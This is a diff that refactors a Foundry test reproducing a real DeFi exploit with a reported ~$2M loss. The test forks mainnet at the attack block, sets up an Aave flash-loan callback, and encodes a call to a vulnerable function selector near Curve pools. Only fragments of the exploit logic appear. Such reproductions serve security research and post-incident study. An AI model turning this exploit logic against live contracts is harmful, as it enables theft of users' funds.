@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~$2M
 // Attacker : https://etherscan.io/address/0x46d9b3dfbc163465ca9e306487cba60bc438f5a2
@@ -41,7 +40,6 @@ contract ContractTest is Test {
     IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     ICurve firstCrvPool = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
     ICurve secondCrvPool = ICurve(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     struct ExactInputSingleParams {
         address tokenIn;
@@ -55,8 +53,8 @@ contract ContractTest is Test {
 
     function setUp() public {
         vm.createSelectFork("mainnet", 18_523_344 - 1);
-        cheats.label(address(weth), "WETH");
-        cheats.label(address(secondCrvPool), "Curve.fi: USDT/WBTC/WETH Pool");
+        vm.label(address(weth), "WETH");
+        vm.label(address(secondCrvPool), "Curve.fi: USDT/WBTC/WETH Pool");
     }
 
     function testExpolit() public {
@@ -66,13 +64,11 @@ contract ContractTest is Test {
         emit log_named_decimal_uint("attacker balance after attack", weth.balanceOf(address(this)), weth.decimals());
     }
 
-    function executeOperation(
-        address asset,
-        uint256 amount,
-        uint256 premium,
-        address initator,
-        bytes calldata params
-    ) external payable returns (bool) {
+    function executeOperation(address asset, uint256 amount, uint256 premium, address initator, bytes calldata params)
+        external
+        payable
+        returns (bool)
+    {
         weth.approve(address(aave), type(uint256).max);
         bytes4 vulnFunctionSignature = hex"f6ebebbb";
         bytes memory data = abi.encodeWithSelector(
